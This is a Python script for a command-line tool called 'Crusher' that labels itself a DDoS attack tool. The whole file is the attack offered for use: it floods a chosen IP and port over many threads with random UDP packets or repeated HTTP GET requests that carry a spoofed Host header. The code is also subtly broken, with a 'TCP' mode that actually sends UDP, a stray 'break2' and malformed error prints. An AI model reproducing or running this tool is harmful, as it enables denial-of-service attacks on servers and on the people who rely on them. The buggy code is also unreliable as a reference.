import stuff.banner
import argparse
import sys
import threading
import random
import socket
import time

# Arguments #
parser = argparse.ArgumentParser(
    prog="Crusher",
    description="A Powerful, Modern DDoS Attack Tool",
    epilog="Copyright (c) 2020, Paxv28, All rights reserved."
)
parser.add_argument(
    "-t",
    "--target",
    type=str,
    metavar="<IP>",
    help="Set Target IP"
)
parser.add_argument(
    "-p",
    "--port",
    type=int,
    metavar="<PORT>",
    help="Set Target Port"
)
parser.add_argument(
    "-th",
    "--threads",
    type=int,
    default=50,
    metavar="<THREADS>",
    help="Set Threads Num | Default 50"
)
parser.add_argument(
    "-m",
    "--method",
    metavar="<TCP/HTTP/UDP>",
    help="Set Attack Method"
)

args = parser.parse_args()
method = str(args.method).upper()
threads = args.threads
target = args.target
port = args.port

# Argument End #

def main():
    if method == 'UDP':
        for i in range(threads):
            try:
                print("[*] Attack Starting in 10s")
                try:
                    time.sleep(10)
                except KeyboardInterrupt:
                    print("[!] Ctrl + C Pressed / Exting...")
                    sys.exit(0)
                    
                th = threading.Thread(target=udp)
                th.start()
            except Exception as err:
                print("Error: \n{err}")
                break

            else:
                continue

    elif method == 'TCP':
        for i in range(threads):
            try:
                print("[*] Attack Starting in 10s")
                time.sleep(10)
                th = threading.Thread(target=tcp)
                th.start()
            except Exception as err:
                print("Error: \n{err}")
                break

    elif method == 'HTTP':
        for i in range(threads):
            try:
                print("[*] Attack Starting in 10s")
                time.sleep(10)
                th = threading.Thread(target=http)
                th.start()
            except Exception as err:
                print("Error:\n{err}")
                break

            else:
                continue

def udp():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    packet = random._urandom(1024)
    while True:
        try:
            s.sendto(packet, (target, port))
            print("[#] Attacking %s %s" %(target, port))
        except:
            print("[!] No Connection, server may be down")
            break2
    sys.exit(0)

def tcp():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    packet = random._urandom(1024)
    while True:
        try:
            s.sendto(packet, (target, port))
            print("[#] Attacking %s %s" %(target, port))
        except:
            print("[!] No Connection, server may be down")
            break
    sys.exit(0)

def http():
    fake_ip = "182.21.20.32" # Don't make you anonymous
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
            s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
            s.close()
            print("[#] Attacking %s %s" %(target, port))
        except:
            print("[!] No Connection, server may be down")
            break
    sys.exit(0)
        
if not target or not method or not port:
    parser.print_help()
    sys.exit()

else:
    main()
